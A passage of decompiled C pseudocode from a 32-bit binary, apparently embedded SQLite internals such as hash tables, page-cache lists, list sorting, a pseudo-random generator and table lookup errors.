  unsigned int v12; // eax
  _DWORD *v13; // edx
  int v14; // [esp+Ch] [ebp-4h]

  if ( *a1 )
  {
    v5 = *a1;
    v14 = sub_10068E33(a3) % v5;
    v6 = sub_10068F5C(a1, a3, a2, v14);
  }
  else
  {
    v14 = 0;
    v6 = sub_10068F5C(a1, a3, a2, 0);
  }
  if ( v6 )
  {
    v7 = v6[2];
    if ( a4 )
    {
      v6[2] = a4;
      v6[3] = (int *)a2;
    }
    else
    {
      sub_10068FA8(v6, a1, v14);
    }
    return v7;
  }
  else
  {
    if ( a4 )
    {
      v9 = (_DWORD *)sub_10058C4C(20);
      v10 = v9;
      if ( !v9 )
        return a4;
      v9[4] = a3;
      v9[3] = a2;
      v9[2] = a4;
      v11 = ++a1[1];
      if ( v11 >= 0xA && v11 > 2 * *a1 && sub_10068EB0(2 * v11, a1) )
        v14 = sub_10068E33(a3) % *a1;
      v12 = a1[3];
      if ( v12 )
        v13 = (_DWORD *)(v12 + 8 * v14);
      else
        v13 = 0;
      sub_10068E5E(v10, v13, (int)a1);
    }
    return 0;
  }
}

//----- (10069106) --------------------------------------------------------
int (*sub_10069106())(void)
{
  int (*result)(void); // eax

  result = dword_10186430;
  if ( dword_10186430 )
    return (int (*)(void))dword_10186430();
  return result;
}
// 10186430: using guessed type int (*dword_10186430)(void);

//----- (10069112) --------------------------------------------------------
int (*sub_10069112())(void)
{
  int (*result)(void); // eax

  result = dword_10186434;
  if ( dword_10186434 )
    return (int (*)(void))dword_10186434();
  return result;
}
// 10186434: using guessed type int (*dword_10186434)(void);

//----- (1006911E) --------------------------------------------------------
_DWORD *__usercall sub_1006911E@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // edx
  int i; // ecx
  int v3; // ecx
  int v4; // ecx

  v1 = (_DWORD *)result[6];
  if ( (_DWORD *)v1[2] == result )
  {
    for ( i = result[8]; i && (*(_BYTE *)(i + 20) & 4) != 0; i = *(_DWORD *)(i + 32) )
      ;
    v1[2] = i;
  }
  v3 = result[7];
  if ( v3 )
    *(_DWORD *)(v3 + 32) = result[8];
  else
    v1[1] = result[8];
  v4 = result[8];
  if ( v4 )
    *(_DWORD *)(v4 + 28) = result[7];
  else
    *v1 = result[7];
  result[7] = 0;
  result[8] = 0;
  return result;
}

//----- (100691BB) --------------------------------------------------------
int __usercall sub_100691BB@<eax>(int a1@<esi>, int a2, int a3, _DWORD *a4)
{
  _DWORD *v4; // edi
  int v5; // eax
  int v6; // ebx
  int result; // eax
  int v8; // eax
  int v9; // ebx
  int v10; // eax
  int v11; // ebx
  int v12; // eax

  v4 = 0;
  if ( !*(_DWORD *)(a1 + 40) && a3 )
  {
    v5 = dword_101821B0(*(_DWORD *)(a1 + 24) + *(_DWORD *)(a1 + 20) + 36, *(_DWORD *)(a1 + 28));
    v6 = v5;
    if ( !v5 )
      return 7;
    dword_101821B4(v5, *(_DWORD *)(a1 + 16));
    *(_DWORD *)(a1 + 40) = v6;
  }
  v8 = 0;
  if ( !*(_DWORD *)(a1 + 28) || !*(_DWORD *)a1 )
    v8 = 1;
  v9 = v8 + 1;
  v10 = *(_DWORD *)(a1 + 40);
  v11 = a3 * v9;
  if ( v10 )
  {
    v4 = (_DWORD *)dword_101821BC(v10, a2, v11);
    if ( v4 )
      goto LABEL_35;
  }
  if ( v11 == 1 )
  {
    v12 = *(_DWORD *)(a1 + 8);
    if ( v12 )
    {
      do
      {
        if ( !*(_WORD *)(v12 + 22) && (*(_BYTE *)(v12 + 20) & 4) == 0 )
          break;
        v12 = *(_DWORD *)(v12 + 32);
      }
      while ( v12 );
      if ( v12 )
        goto LABEL_22;
    }
    v12 = *(_DWORD *)(a1 + 4);
    if ( v12 )
    {
      do
      {
        if ( !*(_WORD *)(v12 + 22) )
          break;
        v12 = *(_DWORD *)(v12 + 32);
      }
      while ( v12 );
      if ( v12 )
      {
LABEL_22:
        result = (*(int (__cdecl **)(_DWORD, int))(a1 + 32))(*(_DWORD *)(a1 + 36), v12);
        if ( result )
        {
          if ( result != 5 )
            return result;
        }
      }
    }
    v4 = (_DWORD *)dword_101821BC(*(_DWORD *)(a1 + 40), a2, 2);
    if ( v4 )
    {
LABEL_35:
      if ( !*v4 )
      {
        memset(v4, 0, *(_DWORD *)(a1 + 24) + 36);
        v4[1] = v4 + 9;
        *v4 = (char *)v4 + *(_DWORD *)(a1 + 24) + 36;
        v4[6] = a1;
        v4[3] = a2;
      }
      if ( !*((_WORD *)v4 + 11) )
        ++*(_DWORD *)(a1 + 12);
      ++*((_WORD *)v4 + 11);
      if ( a2 == 1 )
        *(_DWORD *)(a1 + 44) = v4;
    }
  }
  *a4 = v4;
  if ( !v4 && v11 )
    return 7;
  return 0;
}
// 101821B0: using guessed type int (__cdecl *dword_101821B0)(_DWORD, _DWORD);
// 101821B4: using guessed type int (__cdecl *dword_101821B4)(_DWORD, _DWORD);
// 101821BC: using guessed type int (__cdecl *dword_101821BC)(_DWORD, _DWORD, _DWORD);

//----- (100692F6) --------------------------------------------------------
int __usercall sub_100692F6@<eax>(int result@<eax>)
{
  int v1; // edx
  bool v2; // zf
  int v3; // ecx
  _DWORD *v4; // eax
  _DWORD *v5; // ecx

  if ( !--*(_WORD *)(result + 22) )
  {
    --*(_DWORD *)(*(_DWORD *)(result + 24) + 12);
    if ( (*(_BYTE *)(result + 20) & 2) != 0 )
    {
      v4 = sub_1006911E((_DWORD *)result);
      v5 = v4;
      result = v4[6];
      v1 = *(_DWORD *)result;
      v2 = *(_DWORD *)result == 0;
      v5[7] = *(_DWORD *)result;
      if ( !v2 )
        *(_DWORD *)(v1 + 32) = v5;
      v2 = *(_DWORD *)(result + 4) == 0;
      *(_DWORD *)result = v5;
      if ( v2 )
        *(_DWORD *)(result + 4) = v5;
      if ( !*(_DWORD *)(result + 8) && (v5[5] & 4) == 0 )
        *(_DWORD *)(result + 8) = v5;
    }
    else
    {
      v3 = result;
      result = *(_DWORD *)(result + 24);
      if ( *(_DWORD *)(result + 28) )
      {
        if ( *(_DWORD *)(v3 + 12) == 1 )
          *(_DWORD *)(result + 44) = 0;
        return dword_101821C0(*(_DWORD *)(result + 40), v3, 0);
      }
    }
  }
  return result;
}
// 101821C0: using guessed type int (__cdecl *dword_101821C0)(_DWORD, _DWORD, _DWORD);

//----- (10069323) --------------------------------------------------------
int __usercall sub_10069323@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *v1; // ecx

  if ( (a1[5] & 2) != 0 )
    a1 = sub_1006911E(a1);
  v1 = (_DWORD *)a1[6];
  --v1[3];
  if ( a1[3] == 1 )
    v1[11] = 0;
  return dword_101821C0(v1[10], a1, 1);
}
// 101821C0: using guessed type int (__cdecl *dword_101821C0)(_DWORD, _DWORD, _DWORD);

//----- (1006934E) --------------------------------------------------------
int *__thiscall sub_1006934E(int this)
{
  int v1; // edx
  bool v2; // zf
  int *result; // eax

  *(_WORD *)(this + 20) &= ~0x20u;
  result = (int *)*(unsigned __int16 *)(this + 20);
  if ( ((unsigned __int8)result & 2) == 0 )
  {
    *(_WORD *)(this + 20) = (unsigned __int16)result | 2;
    result = *(int **)(this + 24);
    v1 = *result;
    v2 = *result == 0;
    *(_DWORD *)(this + 28) = *result;
    if ( !v2 )
      *(_DWORD *)(v1 + 32) = this;
    v2 = result[1] == 0;
    *result = this;
    if ( v2 )
      result[1] = this;
    if ( !result[2] && (*(_BYTE *)(this + 20) & 4) == 0 )
      result[2] = this;
  }
  return result;
}

//----- (10069369) --------------------------------------------------------
_DWORD *__usercall sub_10069369@<eax>(_DWORD *result@<eax>)
{
  if ( (result[5] & 2) != 0 )
  {
    result = sub_1006911E(result);
    *((_WORD *)result + 10) &= 0xFFF9u;
    if ( !*((_WORD *)result + 11) )
      JUMPOUT(0x10069199);
  }
  return result;
}
// 10069383: control flows out of bounds to 10069199

//----- (10069389) --------------------------------------------------------
int *__usercall sub_10069389@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v2; // edx
  bool v3; // zf
  int *result; // eax

  dword_101821C4(*(_DWORD *)(*(_DWORD *)(a2 + 24) + 40), a2, *(_DWORD *)(a2 + 12));
  result = (int *)*(unsigned __int16 *)(a2 + 20);
  *(_DWORD *)(a2 + 12) = a1;
  if ( ((unsigned __int8)result & 2) != 0 && ((unsigned __int8)result & 4) != 0 )
  {
    sub_1006911E((_DWORD *)a2);
    result = *(int **)(a2 + 24);
    v2 = *result;
    v3 = *result == 0;
    *(_DWORD *)(a2 + 28) = *result;
    if ( !v3 )
      *(_DWORD *)(v2 + 32) = a2;
    v3 = result[1] == 0;
    *result = a2;
    if ( v3 )
      result[1] = a2;
    if ( !result[2] && (*(_BYTE *)(a2 + 20) & 4) == 0 )
      result[2] = a2;
  }
  return result;
}
// 101821C4: using guessed type int (__cdecl *dword_101821C4)(_DWORD, _DWORD, _DWORD);

//----- (100693BB) --------------------------------------------------------
int __usercall sub_100693BB@<eax>(int result@<eax>, int a2@<esi>)
{
  unsigned int v2; // ebx
  _DWORD *v3; // eax
  _DWORD *v4; // edi
  void **v5; // eax

  v2 = result;
  if ( *(_DWORD *)(a2 + 40) )
  {
    v3 = *(_DWORD **)a2;
    if ( *(_DWORD *)a2 )
    {
      do
      {
        v4 = (_DWORD *)v3[7];
        if ( v3[3] > v2 )
          sub_10069369(v3);
        v3 = v4;
      }
      while ( v4 );
    }
    if ( !v2 )
    {
      v5 = *(void ***)(a2 + 44);
      if ( v5 )
      {
        memset(*v5, 0, *(_DWORD *)(a2 + 20));
        v2 = 1;
      }
    }
    return dword_101821C8(*(_DWORD *)(a2 + 40), v2 + 1);
  }
  return result;
}
// 101821C8: using guessed type int (__cdecl *dword_101821C8)(_DWORD, _DWORD);

//----- (10069408) --------------------------------------------------------
int __usercall sub_10069408@<eax>(int a1@<eax>, int a2@<edx>)
{
  char *v2; // ecx
  char v4; // [esp+0h] [ebp-24h] BYREF
  int v5; // [esp+8h] [ebp-1Ch]

  v2 = &v4;
  if ( !a1 )
    goto LABEL_9;
  do
  {
    if ( !a2 )
      break;
    if ( *(_DWORD *)(a1 + 12) >= *(_DWORD *)(a2 + 12) )
    {
      *((_DWORD *)v2 + 2) = a2;
      v2 = (char *)a2;
      a2 = *(_DWORD *)(a2 + 8);
    }
    else
    {
      *((_DWORD *)v2 + 2) = a1;
      v2 = (char *)a1;
      a1 = *(_DWORD *)(a1 + 8);
    }
  }
  while ( a1 );
  if ( a1 )
    *((_DWORD *)v2 + 2) = a1;
  else
LABEL_9:
    *((_DWORD *)v2 + 2) = a2;
  return v5;
}

//----- (1006944A) --------------------------------------------------------
int __usercall sub_1006944A@<eax>(int a1@<eax>)
{
  _DWORD *v2; // ecx
  int v3; // edx
  int v4; // edi
  int *v5; // esi
  int v6; // eax
  int result; // eax
  int i; // esi
  int v9[32]; // [esp+8h] [ebp-80h] BYREF

  memset(v9, 0, sizeof(v9));
  while ( a1 )
  {
    v2 = (_DWORD *)(a1 + 8);
    v3 = a1;
    a1 = *(_DWORD *)(a1 + 8);
    v4 = 0;
    *v2 = 0;
    while ( 1 )
    {
      v5 = &v9[v4];
      if ( !*v5 )
        break;
      v6 = sub_10069408(*v5, v3);
      *v5 = 0;
      ++v4;
      v3 = v6;
      if ( v4 >= 31 )
        goto LABEL_7;
    }
    v9[v4] = v3;
LABEL_7:
    if ( v4 == 31 )
      v9[31] = sub_10069408(v9[31], v3);
  }
  result = v9[0];
  for ( i = 1; i < 32; ++i )
    result = sub_10069408(result, v9[i]);
  return result;
}

//----- (100694C8) --------------------------------------------------------
void __usercall sub_100694C8(int a1@<eax>, int a2, _BYTE *Src)
{
  _DWORD *v4; // eax
  unsigned int v5; // edi
  int *v6; // edi
  int v7; // eax

  if ( *(_DWORD *)(a1 + 188) )
  {
    v4 = sub_10059194(Src);
    v5 = (unsigned int)v4;
    if ( !v4 )
      return;
    (*(void (__cdecl **)(_DWORD, int, int, _DWORD *))(a1 + 188))(*(_DWORD *)(a1 + 196), a1, a2, v4);
    sub_10058EC7(a1, v5);
  }
  if ( *(_DWORD *)(a1 + 192) )
  {
    v6 = sub_1005A85A(a1);
    if ( v6 )
      sub_1005A3FE(0, (int)v6, -1, Src, 1);
    v7 = sub_1005A7DD((int)v6, 2u);
    if ( v7 )
      (*(void (__cdecl **)(_DWORD, int, _DWORD, int))(a1 + 192))(
        *(_DWORD *)(a1 + 196),
        a1,
        *(unsigned __int8 *)(*(_DWORD *)(*(_DWORD *)(a1 + 8) + 12) + 73),
        v7);
    sub_1005AA4D(v6);
  }
}

//----- (10069560) --------------------------------------------------------
int __usercall sub_10069560@<eax>(_DWORD *a1@<edi>, int a2)
{
  _BYTE *v2; // ebx
  int v3; // esi
  int *v4; // eax

  v2 = (_BYTE *)*a1;
  v3 = 0;
  while ( 1 )
  {
    v4 = sub_10069699(a2, byte_100FEC14[v3], v2, 0);
    if ( v4[3] )
      break;
    if ( ++v3 >= 3 )
      return 1;
  }
  memcpy(a1, v4, 0x14u);
  a1[4] = 0;
  return 0;
}

//----- (100695A6) --------------------------------------------------------
int *__usercall sub_100695A6@<eax>(int *a1@<eax>, int a2@<ebx>, unsigned __int8 a3, _BYTE *Src)
{
  int *v4; // edi

  v4 = a1;
  if ( !a1 && (v4 = sub_10069699(a2, a3, Src, 0)) == 0 || !v4[3] )
  {
    sub_100694C8(a2, a3, Src);
    v4 = sub_10069699(a2, a3, Src, 0);
  }
  if ( v4 && !v4[3] && sub_10069560(v4, a2) )
    return 0;
  return v4;
}

//----- (1006960E) --------------------------------------------------------
int *__usercall sub_1006960E@<eax>(int a1@<ebx>, _BYTE *Src, int a3)
{
  _BYTE *v3; // edi
  unsigned __int8 *v4; // ecx
  int *v5; // esi
  int *v6; // eax

  v3 = sub_10059297(Src);
  v5 = sub_10068FF9((int)v3, (_DWORD *)(a1 + 384), v4);
  if ( !v5 )
  {
    if ( a3 )
    {
      v5 = sub_1005904B(a1, (size_t)(v3 + 61));
      if ( v5 )
      {
        *v5 = (int)(v5 + 15);
        *((_BYTE *)v5 + 4) = 1;
        v5[5] = (int)(v5 + 15);
        *((_BYTE *)v5 + 24) = 2;
        v5[10] = (int)(v5 + 15);
        *((_BYTE *)v5 + 44) = 3;
        memcpy(v5 + 15, Src, (size_t)v3);
        v3[*v5] = 0;
        v6 = sub_10069032((unsigned int *)(a1 + 384), (unsigned __int8 *)*v5, (int)v3, v5);
        if ( v6 )
        {
          *(_BYTE *)(a1 + 30) = 1;
          sub_10058EC7(a1, (unsigned int)v6);
          return 0;
        }
      }
    }
  }
  return v5;
}
// 10069624: variable 'v4' is possibly undefined

//----- (10069699) --------------------------------------------------------
int *__usercall sub_10069699@<eax>(int a1@<eax>, unsigned __int8 a2, _BYTE *Src, int a4)
{
  int *result; // eax

  if ( Src )
    result = sub_1006960E(a1, Src, a4);
  else
    result = *(int **)(a1 + 44);
  if ( result )
    return &result[5 * a2 - 5];
  return result;
}

//----- (100696C9) --------------------------------------------------------
int __usercall sub_100696C9@<eax>(__int16 *a1@<ecx>, int a2@<esi>, char a3)
{
  __int16 v3; // dx
  int result; // eax
  char v5; // cl

  v3 = *a1;
  result = 0;
  if ( *a1 == -1 || v3 == a2 || a2 == -1 && (*((_DWORD *)a1 + 3) || *((_DWORD *)a1 + 4)) )
  {
    result = 1;
    if ( v3 == a2 || a2 == -1 )
      result = 4;
    v5 = *((_BYTE *)a1 + 2);
    if ( a3 == v5 )
    {
      result += 2;
    }
    else if ( a3 == 2 && v5 == 3 || a3 == 3 && v5 == 2 )
    {
      ++result;
    }
  }
  return result;
}

//----- (10069726) --------------------------------------------------------
int __usercall sub_10069726@<eax>(int a1@<eax>, int a2@<ecx>, int a3@<ebx>, unsigned __int8 *a4)
{
  int i; // esi
  _BYTE *v5; // edi

  for ( i = *(_DWORD *)(a2 + 4 * a1); ; i = *(_DWORD *)(i + 28) )
  {
    if ( !i )
      return 0;
    v5 = *(_BYTE **)(i + 24);
    if ( !sub_100593F9(v5, a3, a4) && !v5[a3] )
      break;
  }
  return i;
}

//----- (10069759) --------------------------------------------------------
_DWORD *__usercall sub_10069759@<eax>(int a1@<esi>, int a2)
{
  _BYTE *v2; // eax
  unsigned __int8 *v3; // ecx
  int v4; // edi
  _DWORD *result; // eax

  v2 = sub_10059297(*(_BYTE **)(a1 + 24));
  v4 = (int)&v2[(unsigned __int8)byte_100FEEC0[*v3]] % 23;
  result = (_DWORD *)sub_10069726(v4, a2, (int)v2, v3);
  if ( result )
  {
    *(_DWORD *)(a1 + 8) = result[2];
    result[2] = a1;
  }
  else
  {
    *(_DWORD *)(a1 + 8) = 0;
    result = (_DWORD *)(a2 + 4 * v4);
    *(_DWORD *)(a1 + 28) = *result;
    *result = a1;
  }
  return result;
}
// 10069768: variable 'v3' is possibly undefined

//----- (100697AC) --------------------------------------------------------
_DWORD *__usercall sub_100697AC@<eax>(size_t Size@<ecx>, int a2@<eax>, int a3, unsigned __int8 *Src, char a5, int a6)
{
  _DWORD *v8; // edi
  __int16 *i; // eax
  int v10; // eax
  int v11; // ebx
  int v12; // eax
  int v14; // [esp+10h] [ebp-Ch]
  __int16 *v15; // [esp+14h] [ebp-8h]
  int v16; // [esp+18h] [ebp-4h]

  v8 = 0;
  v16 = 0;
  v14 = (int)(Size + (unsigned __int8)byte_100FEEC0[*Src]) % 23;
  for ( i = (__int16 *)sub_10069726(v14, a3 + 292, Size, Src); ; i = (__int16 *)*((_DWORD *)v15 + 2) )
  {
    v15 = i;
    if ( !i )
      break;
    v10 = sub_100696C9(i, a2, a5);
    if ( v10 > v16 )
    {
      v8 = v15;
      v16 = v10;
    }
  }
  if ( a6 )
  {
    if ( v16 < 6 || *(__int16 *)v8 != a2 )
    {
      v8 = sub_1005904B(a3, Size + 33);
      if ( !v8 )
        return 0;
      v8[6] = v8 + 8;
      *(_WORD *)v8 = a2;
      *((_BYTE *)v8 + 2) = a5;
      memcpy(v8 + 8, Src, Size);
      *(_BYTE *)(Size + v8[6]) = 0;
      sub_10069759((int)v8, a3 + 292);
    }
LABEL_17:
    if ( !v8 )
      return 0;
    goto LABEL_18;
  }
  if ( !v8 )
  {
    v11 = sub_10069726(v14, (int)&unk_10194F20, Size, Src);
    if ( !v11 )
      return 0;
    do
    {
      v12 = sub_100696C9((__int16 *)v11, a2, a5);
      if ( v12 > v16 )
      {
        v8 = (_DWORD *)v11;
        v16 = v12;
      }
      v11 = *(_DWORD *)(v11 + 8);
    }
    while ( v11 );
    goto LABEL_17;
  }
LABEL_18:
  if ( v8[4] || v8[3] || a6 )
    return v8;
  return 0;
}

//----- (100698C8) --------------------------------------------------------
void __cdecl sub_100698C8(_DWORD *a1)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // esi
  _DWORD *v3; // esi
  _DWORD v4[2]; // [esp+10h] [ebp-20h] BYREF
  _DWORD *v5; // [esp+18h] [ebp-18h]
  int v6; // [esp+1Ch] [ebp-14h]
  _DWORD v7[2]; // [esp+20h] [ebp-10h] BYREF
  _DWORD *v8; // [esp+28h] [ebp-8h]
  int v9; // [esp+2Ch] [ebp-4h]

  v1 = a1;
  v7[0] = a1[1];
  v7[1] = a1[2];
  v8 = (_DWORD *)a1[3];
  v9 = a1[4];
  v4[0] = a1[9];
  v4[1] = a1[10];
  v5 = (_DWORD *)a1[11];
  v6 = a1[12];
  a1[11] = 0;
  a1[10] = 0;
  a1[9] = 0;
  a1[12] = 0;
  sub_10068E02(a1 + 5);
  v2 = v5;
  if ( v5 )
  {
    do
    {
      sub_10072E75(0, v2[2]);
      v2 = (_DWORD *)*v2;
    }
    while ( v2 );
    v1 = a1;
  }
  sub_10068E02(v4);
  v3 = v8;
  a1[3] = 0;
  a1[2] = 0;
  a1[1] = 0;
  a1[4] = 0;
  while ( v3 )
  {
    sub_1006A1BB(v3[2]);
    v3 = (_DWORD *)*v3;
  }
  sub_10068E02(v7);
  sub_10068E02(v1 + 13);
  *((_WORD *)v1 + 37) &= ~1u;
  v1[17] = 0;
}
// 100698C8: using guessed type _DWORD var_10[2];
// 100698C8: using guessed type _DWORD var_20[2];

//----- (10069973) --------------------------------------------------------
_DWORD *__usercall sub_10069973@<eax>(int a1@<eax>, int a2)
{
  _DWORD *result; // eax

  if ( a1 )
    result = (_DWORD *)sub_10066C25(a1, 0x54u, (int)sub_100698C8);
  else
    result = sub_10059025(0x54u);
  if ( result )
  {
    if ( !*((_BYTE *)result + 72) )
    {
      result[3] = 0;
      result[2] = 0;
      result[1] = 0;
      result[4] = 0;
      result[7] = 0;
      result[6] = 0;
      result[5] = 0;
      result[8] = 0;
      result[11] = 0;
      result[10] = 0;
      result[9] = 0;
      result[12] = 0;
      result[15] = 0;
      result[14] = 0;
      result[13] = 0;
      result[16] = 0;
      *((_BYTE *)result + 73) = 1;
    }
  }
  else
  {
    *(_BYTE *)(a2 + 30) = 1;
  }
  return result;
}

//----- (100699DD) --------------------------------------------------------
char __usercall sub_100699DD@<al>(int a1@<edi>, int a2@<esi>)
{
  int v2; // eax
  int i; // eax
  int j; // eax
  char *v5; // ecx
  char v6; // dl
  char *v7; // eax
  char v8; // cl
  char v10[256]; // [esp+4h] [ebp-100h] BYREF

  if ( !byte_10184338 )
  {
    byte_1018433A = 0;
    byte_10184339 = 0;
    v2 = sub_100674CF(a1, a2, 0);
    (*(void (__cdecl **)(int, int, char *))(v2 + 56))(v2, 256, v10);
    for ( i = 0; i < 256; ++i )
      byte_1018433B[i] = i;
    for ( j = 0; j < 256; ++j )
    {
      byte_1018433A += byte_1018433B[j] + v10[j];
      v5 = &byte_1018433B[(unsigned __int8)byte_1018433A];
      v6 = *v5;
      *v5 = byte_1018433B[j];
      byte_1018433B[j] = v6;
    }
    byte_10184338 = 1;
  }
  v7 = &byte_1018433B[(unsigned __int8)++byte_10184339];
  v8 = *v7;
  byte_1018433A += *v7;
  *v7 = byte_1018433B[(unsigned __int8)byte_1018433A];
  byte_1018433B[(unsigned __int8)byte_1018433A] = v8;
  return byte_1018433B[(unsigned __int8)(v8 + byte_1018433B[(unsigned __int8)byte_10184339])];
}
// 100699DD: could not find valid save-restore pair for esi
// 10184338: using guessed type char byte_10184338;
// 10184339: using guessed type char byte_10184339;
// 1018433A: using guessed type char byte_1018433A;
// 100699DD: using guessed type char var_100[256];

//----- (10069AB6) --------------------------------------------------------
int __usercall sub_10069AB6@<eax>(char *a1@<eax>, int a2)
{
  int v3; // edi

  v3 = sub_100612DC();
  sub_10061305(v3);
  while ( a2 )
  {
    --a2;
    *a1 = sub_100699DD(v3, (int)a1);
    ++a1;
  }
  return sub_10061317(v3);
}

//----- (10069AEC) --------------------------------------------------------
int __usercall sub_10069AEC@<eax>(int a1@<eax>, int a2@<ebx>, int a3, char a4, int a5)
{
  int v5; // esi
  int v6; // eax
  int v7; // ecx
  int v8; // edx
  int result; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // ecx
  bool v12; // cl

  v5 = a1;
  v6 = *(_DWORD *)(a1 + 424);
  if ( v6 )
    v5 = v6;
  v7 = *(_DWORD *)(v5 + 400);
  v8 = 0;
  if ( v7 <= 0 )
  {
LABEL_8:
    v10 = sub_10059167(*(_DWORD *)v5, *(void **)(v5 + 404), 16 * (v7 + 1));
    *(_DWORD *)(v5 + 404) = v10;
    if ( v10 )
    {
      v11 = &v10[4 * (*(_DWORD *)(v5 + 400))++];
      *v11 = a3;
      *((_BYTE *)v11 + 8) = a4;
      result = a5;
      v11[1] = a2;
      v11[3] = a5;
    }
    else
    {
      result = *(_DWORD *)v5;
      *(_DWORD *)(v5 + 400) = 0;
      *(_BYTE *)(result + 30) = 1;
    }
  }
  else
  {
    result = *(_DWORD *)(v5 + 404);
    while ( *(_DWORD *)result != a3 || *(_DWORD *)(result + 4) != a2 )
    {
      ++v8;
      result += 16;
      if ( v8 >= v7 )
        goto LABEL_8;
    }
    v12 = *(_BYTE *)(result + 8) || a4;
    *(_BYTE *)(result + 8) = v12;
  }
  return result;
}

//----- (10069B97) --------------------------------------------------------
int *__usercall sub_10069B97@<eax>(int *a1@<eax>)
{
  int *result; // eax
  int v3; // ebx
  int v4; // esi
  int *i; // [esp+Ch] [ebp-4h]

  result = sub_1007C271(a1);
  v3 = 0;
  v4 = 0;
  for ( i = result; v4 < a1[100]; v3 += 16 )
  {
    result = (int *)sub_1005AC02(
                      i,
                      120,
                      *(_DWORD *)(v3 + a1[101]),
                      *(_DWORD *)(v3 + a1[101] + 4),
                      *(unsigned __int8 *)(v3 + a1[101] + 8),
                      *(unsigned __int16 **)(v3 + a1[101] + 12),
                      (_BYTE *)0xFFFFFFFE);
    ++v4;
  }
  return result;
}

//----- (10069BE9) --------------------------------------------------------
int *__usercall sub_10069BE9@<eax>(int *result@<eax>)
{
  int *v1; // edi
  int v2; // esi
  unsigned __int16 *v3; // eax
  bool v4; // al
  int *v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+14h] [ebp-Ch]
  int i; // [esp+14h] [ebp-Ch]
  int v8; // [esp+18h] [ebp-8h]
  int *v9; // [esp+1Ch] [ebp-4h]

  v1 = result;
  v2 = *result;
  if ( !*(_BYTE *)(*result + 30) && !*((_BYTE *)result + 19) && !result[16] )
  {
    result = sub_1007C271(result);
    v9 = result;
    if ( !result )
      goto LABEL_30;
    sub_1005ABB9((int)result, 6);
    result = (int *)v1[87];
    if ( (int)result > 0 )
    {
      sub_1005AE20((int)result - 1, (int)v9);
      v8 = 0;
      v6 = 1;
      if ( *(int *)(v2 + 4) > 0 )
      {
        v5 = v1 + 88;
        do
        {
          if ( (v6 & v1[85]) != 0 )
          {
            sub_1005B0F6(v8, v9);
            sub_1005ABE8((int)v9, 34, v8, (v6 & v1[84]) != 0);
            if ( !*(_BYTE *)(v2 + 124) )
              sub_1005ABE8((int)v9, 37, v8, *v5);
          }
          v6 *= 2;
          ++v8;
          ++v5;
        }
        while ( v8 < *(_DWORD *)(v2 + 4) );
      }
      for ( i = 0; i < v1[131]; ++i )
      {
        v3 = (unsigned __int16 *)sub_10070E9E(*(_DWORD *)(v1[132] + 4 * i), v2);
        sub_1005AC02(v9, 121, 0, 0, 0, v3, (_BYTE *)0xFFFFFFF6);
      }
      v1[131] = 0;
      sub_10069B97(v1);
      sub_100793F3(v1);
      result = (int *)sub_1005ABE8((int)v9, 1, 0, v1[87]);
    }
    if ( v1[16] || *(_BYTE *)(v2 + 30) )
    {
LABEL_30:
      if ( !v1[1] )
        v1[1] = 1;
    }
    else
    {
      if ( v1[104] && !v1[17] )
        v1[17] = 1;
      v4 = *((_BYTE *)v1 + 344) && *((_BYTE *)v1 + 345);
      result = (int *)sub_1005B1ED((int)v9, v1[111], v1[18], v1[17], v1[105], *((unsigned __int8 *)v1 + 476), v4);
      v1[1] = 101;
      *((_BYTE *)v1 + 16) = 0;
    }
    v1[17] = 0;
    v1[18] = 0;
    v1[19] = 0;
    v1[111] = 0;
    v1[85] = 0;
    v1[87] = 0;
  }
  return result;
}

//----- (10069DB8) --------------------------------------------------------
void __usercall sub_10069DB8(int a1@<edi>, char *a2, ...)
{
  int v2; // ebx
  char Src[100]; // [esp+Ch] [ebp-70h] BYREF
  int v4; // [esp+74h] [ebp-8h]
  unsigned int v5; // [esp+78h] [ebp-4h] BYREF
  va_list va; // [esp+88h] [ebp+Ch] BYREF

  va_start(va, a2);
  v5 = 0;
  v2 = *(_DWORD *)a1;
  if ( !*(_DWORD *)(a1 + 64) )
  {
    v4 = sub_10055425(v2, a2, (int *)va);
    if ( v4 )
    {
      ++*(_BYTE *)(a1 + 19);
      memcpy(Src, (const void *)(a1 + 444), sizeof(Src));
      memset((void *)(a1 + 444), 0, 0x64u);
      sub_10071EAC(a1, v4, &v5);
      sub_10058EC7(v2, v5);
      sub_10058EC7(v2, v4);
      memcpy((void *)(a1 + 444), Src, 0x64u);
      --*(_BYTE *)(a1 + 19);
    }
  }
}
// 10071EAC: using guessed type _DWORD __cdecl sub_10071EAC(_DWORD, _DWORD, _DWORD);

//----- (10069E40) --------------------------------------------------------
int *__usercall sub_10069E40@<eax>(int a1@<edi>, unsigned __int8 *a2, unsigned __int8 *a3)
{
  _BYTE *v3; // eax
  int v4; // ebx
  int v5; // esi
  int i; // [esp+4h] [ebp-Ch]
  int *v8; // [esp+8h] [ebp-8h]
  int v9; // [esp+Ch] [ebp-4h]

  v8 = 0;
  v3 = sub_10059297(a2);
  v4 = *(_DWORD *)(a1 + 4);
  v9 = 0;
  for ( i = (int)v3; v9 < v4; ++v9 )
  {
    v5 = v9;
    if ( v9 < 2 )
      v5 = v9 ^ 1;
    if ( !a3 || !sub_100593BE(a3, *(unsigned __int8 **)(16 * v5 + *(_DWORD *)(a1 + 8))) )
    {
      v8 = sub_10068FF9(i, (_DWORD *)(*(_DWORD *)(16 * v5 + *(_DWORD *)(a1 + 8) + 12) + 4), a2);
      if ( v8 )
        break;
    }
  }
  return v8;
}

//----- (10069EB7) --------------------------------------------------------
int *__cdecl sub_10069EB7(int a1, int a2, unsigned __int8 *a3, unsigned __int8 *a4)
{
  int *v5; // ebx
  const char *v6; // eax

  if ( sub_10058497((_DWORD *)a1) )
    return 0;
  v5 = sub_10069E40(*(_DWORD *)a1, a3, a4);
  if ( !v5 )
  {
    v6 = aNoSuchView;
    if ( !a2 )
      v6 = aNoSuchTable;
    if ( a4 )
      sub_10059320((int *)a1, "%s: %s.%s", v6, (const char *)a4, (const char *)a3);
    else
      sub_10059320((int *)a1, "%s: %s", v6, (const char *)a3);
    *(_BYTE *)(a1 + 18) = 1;
  }
  return v5;
}

//----- (10069F30) --------------------------------------------------------
int *__cdecl sub_10069F30(unsigned __int8 *a1, unsigned __int8 *a2)
{
  _BYTE *v2; // eax
  int v3; // edx
  int v4; // edi
  int v5; // ebx
  int v6; // eax
  int v7; // eax
